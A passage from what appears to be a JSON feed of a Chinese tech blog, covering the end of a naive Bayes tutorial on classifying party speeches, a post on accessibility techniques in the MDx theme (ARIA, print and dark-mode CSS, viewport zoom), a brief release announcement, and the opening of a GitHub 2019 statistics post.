\\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\"># 读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') # 按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") # 分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): # 判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                # 统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif word_list[0] == \"RED\":\r\n        # Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') # 按行分隔\r\ntest_data = []\r\n\r\nfor line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n    elif line_data[0] == 'RED':\r\n        # ...\r\n\r\nfor line_data in test_data:\r\n    posibility_blue = 0\r\n    for word in line_data[\"content\"]:\r\n        # 计算各单词概率，取对数后相加，使用了拉普拉斯平滑\r\n        if word in word_count_blue:\r\n            posibility_blue += math.log((word_count_blue[word]+1)/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n        else:\r\n            posibility_blue += math.log(1/(len(data_blue)+len(unique_words_blue)+len(unique_words_red)))\r\n    # 最后加上该分类概率的对数\r\n    posibility_blue += math.log(len(data_blue)/(len(data_blue)+len(data_red)))\r\n\r\n    # 计算 Red 同理...</pre>\n<p>计算完成后，我们就得到每篇演讲稿在各分类下的概率了。之后，简单的比较就能得出推断的分类：如果 \\(P(Red|Article)\\) 大于 \\(P(Blue|Article)\\)，那么这篇演讲稿就更可能是共和党的演讲稿，反之则是民主党的演讲稿。</p>\n<p>很好理解吧？那么这么简单的思路，准确性怎么样呢？对于我们的例子，这是我设置了个别停用词后的结果：</p>\n<pre class=\"EnlighterJSRAW\">+-----+-------+--------------+--------------+-------+-------+\r\n|   ID|  Class|        P(Red)|       P(Blue)|  Guess| Status|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|    1|   Blue|  -23204.68377|  -22998.67066|   Blue|      √|\r\n|    2|   Blue|  -16438.44625|  -16137.48257|   Blue|      √|\r\n|    3|   Blue|  -33468.81214|  -32567.61801|   Blue|      √|\r\n|    4|   Blue|    -8606.2193|   -8601.50426|   Blue|      √|\r\n|    5|   Blue|  -12430.97436|  -11935.70662|   Blue|      √|\r\n|    6|   Blue|  -44033.02883|  -43877.55367|   Blue|      √|\r\n|    7|   Blue|   -16947.2851|  -16758.57542|   Blue|      √|\r\n|    8|   Blue|  -26957.26997|  -26889.62444|   Blue|      √|\r\n|    9|   Blue|  -27503.73985|  -27249.21828|   Blue|      √|\r\n|   10|   Blue|   -20528.4457|   -19991.1248|   Blue|      √|\r\n|   11|   Blue|  -20337.96493|  -19860.12831|   Blue|      √|\r\n|   12|   Blue|  -28409.28489|  -28118.98017|   Blue|      √|\r\n|   13|    Red|  -13756.01015|  -14488.11751|    Red|      √|\r\n|   14|    Red|  -17221.22732|  -17710.15936|    Red|      √|\r\n|   15|    Red|  -17397.45136|  -17899.98659|    Red|      √|\r\n|   16|    Red|  -10724.69095|  -11092.77837|    Red|      √|\r\n|   17|    Red|  -10402.40027|  -10859.48681|    Red|      √|\r\n|   18|    Red|   -9371.53792|    -9669.6769|    Red|      √|\r\n+-----+-------+--------------+--------------+-------+-------+\r\n|                                      Total: 18/18, 100.0% |\r\n+-----------------------------------------------------------+</pre>\n<p><strong>100% 的准确率哦！</strong>事实上，对于我们的这个例子，就算不设置停用词，我们仍能达到 100% 的分类准确率。朴素贝叶斯分类的确很 NB 呢。</p>\n<h1>更进一步</h1>\n<p>我们的探索到这里就结束了，但如果你有兴趣，完全可以继续探索下去。我们的例子是一个非常简化的例子，在实际情况中，还有很多问题需要解决。比如，对于中文及类似语言，不存在拉丁语系的天然分词结构，而朴素贝叶斯的文本分类是基于单词的，那么<strong>中文的分词就会是个问题；</strong>再比如，对于朴素贝叶斯分类来说，<strong>词语之间的顺序是不影响分类结果的</strong>，但这就会导致“今天心情很好，但昨天不好”和“昨天心情很好，但今天不好”在朴素贝叶斯看来是一样的，要想获得更好的结果，我们必须<strong>考虑词语的顺序。</strong></p>\n<p>这些问题，今天我们就不再深究了，但你可以自己探索。比如，引入思路同样很简洁的马尔科夫链，我们就可以让计算机学会考虑词语间的顺序，不过那就会是另一个话题了。</p>\n","link":"https://flyhigher.top/develop/1989.html"},{"title":"MDx 中增强页面可访问性的细节","date":"2020-01-25 16:45:04","description":"\n<blockquote><p>这篇文章本来是打算发在 <a href=\"https://mdxblog.flyhigher.top/\">MDx Blog</a> 的，不过写到后来发现这篇文章相对来说还是有价值的，于是就将这篇文章转移到了无垠，MDx Blog 则不再发表这篇文章。</p></blockquote>\n<p>从 MDx 开发之初，增强页面的可访问性就被列为了一个重要目标。从 HTML 语义化，到 ARIA 地标，再到 <code>prefers-reduced-motion</code>，随着浏览器对于增强页面可访问性的支持功能越来越多，MDx 也在不断地更新，让更多的人都能毫无困难地浏览、查看由 MDx 渲染的网页。本文会详细说明一些 MDx 中增强页面可访问性的细节，<strong>如果你希望增强自己开发的网页的可访问性，本文可能会对你有所帮助。</strong></p>\n<h1>基础性增强</h1>\n<p>增强可访问性，最重要也是最基础的一点就是 HTML 语义化。通过使用 HTML 5 语义化标签和 ARIA Role 标签，我们可以很方便地<strong>将整个网页在语义上分为几部分，而这将有效地改善屏幕阅读器对网页的分析质量，使视力障碍用户更好地浏览网页。</strong></p>\n<h2>HTML 语义化</h2>\n<p><strong>HTML 语义化属于增强页面可访问性的基础中的基础。</strong>通过使用语义化的 HTML 标签，我们可以方便地为网页中的各部分标记功能而不影响页面样式。随着符合 HTML 5 的现代化网页成为主流，语义化标签已被很大一部分网站所支持，我也不过多赘述了。就举几个常用的“地标性”标签吧：</p>\n<ul>\n<li>\n<code>header</code> 标签标记页眉，默认样式同 <code>div</code>，不要把它和 <code>head</code> 搞混了</li>\n<li>\n<code>main</code> 标签标记页面的主要内容，默认样式同 <code>div</code>\n</li>\n<li>\n<code>article</code> 标签标记文章（在 HTML 5 中它指任何独立或可复用的文本），默认样式同 <code>div</code>\n</li>\n<li>\n<code>footer</code> 标签标记页脚，默认样式同 <code>div</code>\n</li>\n<li>\n<code>nav</code> 标签标记页面导航栏区域，默认样式同 <code>div</code>\n</li>\n<li>\n<code>aside</code> 标签标记侧栏，默认样式同 <code>div</code>\n</li>\n<li>\n<code>section</code> 标签标记“一组内容”，你可以把它看作是划定网页中一块区域的通用标签，默认样式同 <code>div</code>\n</li>\n</ul>\n<p>只要用这些标签替代 <code>div</code> 而不是无脑使用 <code>div</code> 就能提高页面的可访问性。MDx 使用了这些标签来增强页面的可访问性。</p>\n<h2>下一步，ARIA</h2>\n<p>有的时候，出于一些原因，我们没法使用语义化的 HTML 标签，或者没有合适的语义化标签来标记内容，这时候<strong>我们就需要使用 ARIA (Accessible Rich Internet Applications，可访问的富互联网应用)。</strong>ARIA 的基础用法很简单，只要在相应元素上加上 <code>role</code> 属性指定该元素的功能即可。下面是一个简单的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;div role=\"navigation\"&gt;\r\n  &lt;ul&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page A&lt;/a&gt;&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page B&lt;/li&gt;\r\n    &lt;li&gt;&lt;a href=\"#\"&gt;Page C&lt;/a&gt;&lt;/li&gt;\r\n  &lt;/ul&gt;\r\n&lt;/div&gt;</pre>\n<p>通过 <code>role=\"navigation\"</code>，我们把一个 <code>div</code> 标记为了导航栏区域。实际上，对屏幕阅读器来说，这和 <code>nav</code> 标签在语义上是一致的。上一节中的例子都可以分别用以下 ARIA Role 表示：</p>\n<ul>\n<li><code>role=\"heading\"</code></li>\n<li><code>role=\"main\"</code></li>\n<li><code>role=\"article\"</code></li>\n<li><code>role=\"contentinfo\"</code></li>\n<li><code>role=\"navigation\"</code></li>\n<li><code>role=\"complementary\"</code></li>\n<li><code>role=\"region\"</code></li>\n</ul>\n<p>除此以外，MDx 还使用了 <code>role=\"banner\"</code> 和 <code>role=\"search\"</code> 来分别标记页面中的顶部栏和搜索表单。另外，<strong>有的时候 <code>role</code> 属性还需配合 <code>aria-*</code> 属性一同使用</strong>，具体规则比较复杂，我就不在这里赘述了，具体可参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles\">WAI-ARIA Roles - MDN</a>。</p>\n<h1>媒体查询来帮忙</h1>\n<p>CSS 的媒体查询其实是一个非常强大的特性，<strong>妥善利用其中的一些特性，我们可以在网页外观上大大增强网页的可访问性。</strong>除了已经烂大街的“对浏览器窗口大小”响应的媒体查询，我会介绍 3 个很少有网站充分利用的媒体查询。</p>\n<h2>print</h2>\n<p><code>print</code> 媒体查询其实已经“历史悠久”了，<strong>只要使用 <code>@media print {...}</code> 就可以创建只在打印页面时生效的样式。</strong>通过这种方式，我们可以让页面在打印时应用一套为打印优化的样式，增强页面在物理纸张上的可访问性。</p>\n<blockquote><p>维基百科是对打印样式做了单独适配的著名例子。</p></blockquote>\n<p><strong>由于在打印的情况下，页面已经离开了“可交互”的范围，还有分页这种在屏幕中无需考虑的问题，要让页面在物理纸张上仍能被轻松地阅读，我们需要做一些特殊的适配。</strong>直接来看一个例子吧。以下是 MDx 针对打印情况进行的一些特殊优化，样式的具体理由已经写在了注释中。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media print {\r\n    /*隐藏不必要的元素*/\r\n    header, .mdx-ad-after-article, .mdx-ad-in-article, .mdx-post-money, .page-footer-nav, .mdx-same-posts, .spanout button, .mdui-drawer, .mdui-overlay, .mdui-menu, .mdx-share-img-dialog, .mdx-share-wechat-dialog {\r\n        display: none!important;\r\n    }\r\n\r\n    /*使用下划线标记链接*/\r\n    article a {\r\n        text-decoration: underline!important;\r\n    }\r\n    /*由于纸张不可交互，在链接后显示链接到的 URL*/\r\n    article a::after {\r\n        content: \"(\" attr(href) \")\";\r\n    }\r\n\r\n    /*强制白底黑字*/\r\n    html &gt; body {\r\n        background-color: white!important;\r\n    }\r\n    article p {\r\n        color: rgba(0,0,0,.8)!important;\r\n    }\r\n\r\n    /*对于纸张上的长文章，衬线字体拥有更好的可读性。以下字体列表来自 fonts.css*/\r\n    article {\r\n        font: 13pt Georgia, \"Nimbus Roman No9 L\", \"Songti SC\", \"Noto Serif CJK SC\", \"Source Han Serif SC\", \"Source Han Serif CN\", STSong, \"AR PL New Sung\", \"AR PL SungtiL GB\", NSimSun, SimSun, \"TW\\-Sung\", \"WenQuanYi Bitmap Song\", \"AR PL UMing CN\", \"AR PL UMing HK\", \"AR PL UMing TW\", \"AR PL UMing TW MBE\", PMingLiU, MingLiU, serif!important;\r\n    }\r\n\r\n    /*除部分元素外，禁止在元素内部分页*/\r\n    * {\r\n        page-break-inside: avoid;\r\n    }\r\n    article p, article a, #comments, article {\r\n        page-break-inside: auto;\r\n    }\r\n}</pre>\n<p>MDx 自 1.9.3 版本起已经包含了对文章页的打印样式优化。可以很容易地看出，优化后的样式在物理纸张上将更容易阅读。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/6.jpg\" alt=\"\" width=\"1345\" height=\"1602\" class=\"aligncenter size-full wp-image-1959\"></a>\n<h2>prefers-color-scheme</h2>\n<p><code>prefers-color-scheme</code> 是最近才被浏览器广泛支持的一个媒体查询，但它的功能却很强大：<strong>响应系统级黑暗模式。</strong>这样，我们可以在开启黑暗模式的系统中让网页具有更好的可读性。不过由于这个媒体查询直到最近才被广泛支持，因此大部分网站对此并没有进行适配。</p>\n<blockquote><p>一些适配这一特性的网站：少数派、微信公众平台（文章页）等。</p></blockquote>\n<p>通过像这样的媒体查询，我们可以在系统启用黑暗模式时让页面实时响应：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    body {\r\n        background-color: #212121;\r\n        color: rgba(255, 255, 255, .7);\r\n    }\r\n}</pre>\n<p><code>prefers-color-scheme</code> 一共有 3 个可能值：<code>no-preference</code>, <code>light</code> 和 <code>dark</code>。你也可以不像上面的例子那样默认使用亮色样式并在黑暗模式下启用黑暗样式，而可以反过来将黑暗样式作为默认，用亮色样式覆盖。在不支持的浏览器上将会显示默认样式（即媒体查询不会生效）。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<h2>prefers-reduced-motion</h2>\n<p>看名字就猜得出，<code>prefers-reduced-motion</code> 是和 <code>prefers-color-scheme</code> 师出同门的媒体查询。因此，和 <code>prefers-color-scheme</code> 一样，它也是在最近才获得了浏览器的广泛支持。它的作用也很强大：<strong>响应系统的“减弱动态效果”模式。</strong>这对某些不喜欢甚至无法接受动画的用户可能很有帮助。要知道，对有些用户来说这甚至是医疗上的必要。使用如下的媒体查询，我们可以在系统启用减弱动态效果模式时让页面实时响应，减弱动画：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-reduced-motion: reduce) {\r\n    /*只是一个示例，实际情况中可以保留一些淡入淡出效果*/\r\n    * {\r\n        transition: all 0s!important;\r\n        transform: none!important;\r\n    }\r\n}</pre>\n<p><code>prefers-reduced-motion</code> 只有 2 个可能值：<code>no-preference</code> 和 <code>reduce</code>，在不支持的浏览器上该媒体查询不会生效。</p>\n<p>MDx 已经在 1.9.6 版本中包含对这一媒体查询的支持。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/5.jpg\" alt=\"\" width=\"792\" height=\"515\" class=\"aligncenter size-full wp-image-1962\"></a>\n<h1>黑暗模式适配</h1>\n<p>黑暗模式可不是简单地切换到黑底白字这么简单。<strong>单纯地使用黑底白字会导致页面元素之间对比度过高，文字刺眼，反而降低了页面的可访问性。</strong>我在下面总结了几条应用在了 MDx 中的黑暗模式优化规则和 Google 推荐的优化规则：</p>\n<p><strong>一是避免黑底白字。</strong>黑底白字看起来真的很难受，事实上，深灰和浅灰是黑暗模式最好的配色。比较下方例子里的两段文本，毫无疑问深灰色背景和浅灰色文字搭配的样式的可读性要比黑底白字高很多。（p.s. 有时候这条规则在白底黑字时也适用）</p>\n<p><strong>二是更改部分元素的亮度和对比度以增强可读性。</strong>你可能已经注意到了，下面优化的例子里标题文字的颜色改变了。很明显，未优化的黑暗模式中标题可读性不如优化的版本。在实际中，我们通常可以通过 CSS 滤镜来实现这一更改。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    h1 {\r\n        /*反相颜色后再将色相旋转 180 度，使亮度反相*/\r\n        filter: invert(1) hue-rotate(180deg);\r\n    }\r\n}</pre>\n<p><strong>三是避免让图片过亮。</strong>未经处理的图片通常会导致过高的对比度，降低可读性。在 MDx 中，我选择降低图片的亮度来避免图片刺眼，而 Google 的建议则是使图片灰度，不过这会影响图片的整体观感。无论是哪一种方案，都可以使用 CSS 滤镜来轻松实现。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"css\">@media (prefers-color-scheme: dark) {\r\n    img { \r\n        /*MDx 方案*/\r\n        filter: brightness(.8);\r\n        /*Google 方案*/\r\n        filter: grayscale(.5);\r\n    }\r\n}</pre>\n<div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是未优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n<div>\n<h1>Cats\n</h1>\n<p>这里是经过优化的黑暗模式预览。接下来，让我们来看点可爱的猫猫吧。</p>\n<p><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/demo.jpg\"></p>\n</div>\n</div>\n<h1>其他细节</h1>\n<p>还有一些细节，虽然简单，但不可或缺。我把一部分没有在上文提到的 MDx 中的细节列在了这里。</p>\n<p><strong>一是允许页面缩放。</strong>在开发响应式页面时，很多网站会在页面头部添加这样一个 <code>meta</code>：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no\"&gt;</pre>\n<p>这样的 <code>meta</code> 设定了页面的宽度，却也固定了页面的缩放比例，用户难以手动放大网页。<strong>这样的设置对一部分视力障碍用户非常不友好</strong>，以至于苹果决定在自家的浏览器上忽略禁止缩放的 <code>meta</code>。按照 Google 的推荐，如果你在 MDx 设置中启用了“允许页面缩放”，那么 MDx 会输出这样的 <code>meta</code> 标签，允许页面进行五倍以内的缩放：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"html\">&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1, maximum-scale=5\"&gt;</pre>\n<p><strong>尽管很多时候放大页面会导致页面结构被破坏，但这大大增强了页面的可访问性，利大于弊。</strong>因此，在 MDx 中，“允许页面缩放”是默认启用的。</p>\n<p><strong>二是在跨设备阅读时同步阅读记录。</strong>这属于 MDx 的“元老级”功能之一。注意到页面右上角的那个“在其他设备上继续阅读”的按钮了吗？如果你滚动页面后重新点击它，你会发现二维码发生变化了。通过在二维码中记录阅读进度，用户在扫描二维码切换设备阅读时，MDx 在新设备上会自动滚动到和原设备上一致的位置——好吧，目前基于百分比的算法在某些情况下可能不太准，但我已经设计了一个更复杂但更精确的阅读进度记录算法，之后就会更新到 MDx 中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/8.jpg\" alt=\"\" width=\"1000\" height=\"574\" class=\"aligncenter size-full wp-image-1976\"></a>\n<p><strong>三是避免 Web 字体阻塞渲染。</strong>如果你在页面中使用了 Web 字体，在字体加载完成之前，浏览器可能不会渲染任何文本，这就导致用户可能需要等待一段时间才能开始浏览网页。Google 推荐使用 <code>font-display: swap;</code> 来向浏览器指定网页的 Web 字体渲染策略。这一规则会提供一个比较短的等待周期，如果在这段时间内 Web 字体没有完成加载，那么浏览器会以 fallback 字体渲染文本。任意时刻一旦 Web 字体完成渲染，浏览器就会使用 Web 字体重新渲染文本。这在大多数情况下都能满足可访问性的需求。</p>\n<p><strong>四是确保 html 元素具有合适的 <code>lang</code> 属性。</strong>这一属性声明了页面的主要语言，浏览器可以据此调整渲染策略，或者触发自动翻译；屏幕阅读器也能更好地阅读网页。</p>\n<p><strong>五是确保页面主要内容在丢失/禁用了 Javascript 甚至 CSS 的情况下仍然可用。</strong>作为一个以内容为主的网站，MDx 在禁用了 Javascript 的情况下页面主要内容仍然可用。这不只是为了 SEO，更是为了保证页面的可访问性。的确，目前的情况下，如果开启了 Lazyload，MDx 在禁用 Javascript 的情况下图片的确无法显示，但我会在后续版本中尽可能的优化这一问题。</p>\n<h1>附录：媒体查询开发技巧</h1>\n<p>有的时候，光有 CSS 响应媒体查询还不够，我们可能需要在 Javascript 中实时响应媒体查询。用如下代码就可以很简单地响应媒体查询：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">let mql = window.matchMedia(\"(prefers-reduced-motion: reduce)\");\r\nmql.addListener(handleMediaChange);\r\n\r\n//在添加监听后先调用一次，获得当前查询结果\r\nhandleMediaChange(mql);\r\n\r\nfunction handleMediaChange(mql){\r\n    if(mql.matches){\r\n        //查询匹配\r\n    }else{\r\n        //查询不匹配\r\n    }\r\n}</pre>\n<p>在开发上述媒体查询的过程中，我们需要频繁地切换系统的相应模式或者调出打印窗口。<strong>实际上，Chrome 提供了更简单的调试方法：</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1946\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2333.jpg\" alt=\"\" width=\"723\" height=\"681\"></a>\n<p>只要在这里更改模式，相关媒体查询就能实时生效。这不会影响其他标签页，在关闭开发者工具之后也会自动恢复系统设置。</p>\n","link":"https://flyhigher.top/develop/1912.html"},{"title":"MDx Blog 现已随 MDx 1.9.5 发布","date":"2020-01-22 17:54:11","description":"<p>随着 MDx 发布 1.9.5 更新，<a href=\"https://mdxblog.flyhigher.top/\" rel=\"noopener noreferrer\" target=\"_blank\">MDx Blog</a> 现已建立。我将会在 MDx Blog 中分享一些开发故事并发布 MDx 更新日志。</p>","link":"https://flyhigher.top/diary/1905.html"},{"title":"GitHub 2019 统计无垠版","date":"2020-01-12 13:02:00","description":"\n<h1>缘起</h1>\n<p>2019 年底，我突发奇想想要自己统计一番 GitHub 上存储库的一些信息。尽管 GitHub 有自己的<a href=\"https://octoverse.github.com/\" target=\"_blank\" rel=\"noopener noreferrer\">年度统计</a>，我还是想试着自己爬取一下，说不定能挖出什么有意思的信息，何况这是我第一次有机会处理比较大量的数据，也算是一种学习的过程吧。于是花了一下午写了个简单的爬虫（时间都花在增加 Rate Limit 上了...），然后扔在了两台服务器上开始跑（GitHub  API 真是好文明）。</p>\n<p>从 2019.11.21 3 时到 2020.1.12 24 时的 52 天 21 小时内，我的爬虫一共爬取了<strong>与 2,024,705 个用户有关<sup>*</sup>的 14,651,923 个公共存储库的基础信息</strong>，平均每秒爬取 3.2 个存储库。据 GitHub 的官方数据计算，我爬取了大约 15% 的存储库信息，但由于封禁库和私有库的数量未知，我暂时无法确定我爬取的存储库占公共库的比例。同时由于存储库数量较多，基本可以认为爬取到的样本在时间尺度上已经足够随机，可以通过统计得出一般结论。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/1.jpg\" alt=\"\" width=\"700\" height=\"606\" class=\"aligncenter size-full wp-image-1892\"></a>\n<p>爬到自己了，合影.jpg</p>\n<p>那么下面就来看看统计出来的一些结果吧。爬虫的技术细节和数据集下载放在文末。</p>\n<p>* 指这些用户拥有至少一个库</p>\n<h1>统计信息</h1>\n<p><strong>以下统计结果均基于已放于文末的数据集。</strong>由于爬虫爬取的时间跨度长，加上我并没有完整爬取 GitHub 所有存储库，因此我<strong>不能保证以下统计结果符合真实情况</strong>，各位可以下载数据集或自行爬取进行验证。</p>\n<h2>一些数据</h2>\n<div>\n<div>\n<div>\n<span>3,120,930</span><br>总爬取用户数</div>\n<div>\n<span>44.7%</span><br>的存储库创建<br>自 